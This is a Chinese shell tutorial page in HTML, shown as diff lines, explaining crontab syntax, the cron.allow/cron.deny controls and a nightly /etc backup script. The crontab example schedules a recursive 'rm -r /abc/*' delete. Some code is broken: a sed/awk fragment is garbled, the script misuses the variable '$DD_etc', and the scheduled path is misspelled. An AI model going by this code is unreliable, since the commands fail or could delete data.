+<li>14. sed -e &rsquo;s/://g&rsquo; -e &rsquo;s/^/| /g&rsquo; -e &rsquo;s/$//g&rsquo;</li>
+
+<li><p>#等价于awk &lsquo;BEGIN {FS=&rdquo;:&ldquo;;OFS=&rdquo;
+| &ldquo;} gsub(/^/,&rdquo;<br />
+&mdash;|&mdash;<br />
+<TD>&rdquo;) gsub(/$/,&rdquo;<br />
+&rdquo;) {print $1,$2,$3,$4}&rsquo;</p></li>
+
+<li><p>cat &lt;</p></li>
+
+<li><ol>
+<li>19.   20. CLOUD</li>
+</ol></li>
+</ol>
+
+<p>（2）crontab定时任务</p>
+
+<p>crondtab是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，与windows下的计划任务类似，crondtab进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。</p>
+
+<p>每个用户都有自己的调度crontab，可以使用crontab -u user -e或切换到user使用vim /etc/crontab（也可crontab
+-e）编辑crontab定时任务调度表。crontab命令选项意义如下：</p>
+
+<p><a href="https://img.it610.com/image/info8/f260ff9ce7d04c1197dc4beb70682a07.jpg"><img src="https://img.it610.com/image/info8/f260ff9ce7d04c1197dc4beb70682a07.jpg" alt="shell浅谈之十二shell调试及主题_第15张图片" /></a></p>
+
+<p>linux还定义了两个控制文件来控制crontab，它们是：/etc/cron.allow和/etc/cron.deny。/etc/cron.allow表示哪些用户能使用crontab命令，若cron.allow为空则表明所有用户都不能安排定时任务；若该文件不存在则会查看/etc/cron.deny，只有不包含在这个文件中的用户才可以使用crontab命令；若cron.deny为空则任何用户都可以安排作业。两个文件同时存在cron.allow优先，同时不存在只有root用户能安排定时任务。</p>
+
+<p>打开/etc/crontab:</p>
+
+<p><a href="https://img.it610.com/image/info8/b06ba63cd5394c5988bd62dcf03294de.jpg"><img src="https://img.it610.com/image/info8/b06ba63cd5394c5988bd62dcf03294de.jpg" alt="shell浅谈之十二shell调试及主题_第16张图片" /></a></p>
+
+<p>crontab文件的基本格式 :<br />
+* * * * * command<br />
+minute hour day month week command</p>
+
+<p>其中：</p>
+
+<p>minute： 表示分钟，可以是从0到59之间的任何整数（每分钟用*或者 */1表示）。</p>
+
+<p>hour：表示小时，可以是从0到23之间的任何整数（0表示0点）。</p>
+
+<p>day：表示日期，可以是从1到31之间的任何整数。</p>
+
+<p>month：表示月份，可以是从1到12之间的任何整数。</p>
+
+<p>week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。</p>
+
+<p>command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。</p>
+
+<p>在以上各个字段中，还可以使用以下特殊字符：</p>
+
+<p>星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。</p>
+
+<p>逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”</p>
+
+<p>中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”</p>
+
+<p>正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。</p>
+
+<p>crontab例子如：下午4:50删除/abc目录下所有子目录和文件： 50 16 * * * rm -r /abc/*</p>
+
+<p>crontab实现定时文件备份的例子，shell脚本实现备份功能，在crontab中定时每天执行脚本。脚本名称为fileback.sh.</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#使用root权限将/etc目录下的所有内容进行备份</li>
+<li>#fileback.sh</li>
+<li>#!/bin/bash</li>
+<li>5. DIRNAME=<code>ls /root | grep bak</code> #获取/root/bak字符串</li>
+<li>7. if [ -z &ldquo;$DIRNAME&rdquo; ] #如果/root/bak不存在，则创建一个</li>
+<li>then</li>
+<li>mkdir /root/bak</li>
+<li>cd /root/bak</li>
+<li>fi</li>
+<li>13. #获取当前年、月、日数据存储到YY、MM、DD变量中</li>
+<li>YY=<code>date +%y</code></li>
+<li>MM=<code>date +%m</code></li>
+<li>DD=<code>date +%d</code></li>
+<li>18. BACKETC=$YY$MM$DD_etc.tar.gz #备份文件的名字</li>
+<li>tar zcvf $BACKETC /etc #将/etc所有文件打包</li>
+<li>echo &ldquo;fileback finished!&rdquo;</li>
+</ol>
+
+<p>先登录root用户，cat /etc/crontab，在末尾加上：59 23 * * * /bin/bash
+/use/bin/filebach.sh，表示每天23:59执行一次 filebach.sh脚本。</p>
+
+<h1 id="三-总结-1">三、总结</h1>
+
+<p>（1）Shell脚本调试难度大，熟练使用trap、tee、调试钩子和shell选项将更方便地调试错误。</p>
+
+<p>（2）Shell下有颜色的脚本和脚本安全的内容还是比较有趣的，读者可以网上搜索更多的内容来补充。</p>
+
+<p>（3）crontab定时任务对于Shell脚本的定时计划性执行还是非常有用的。</p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
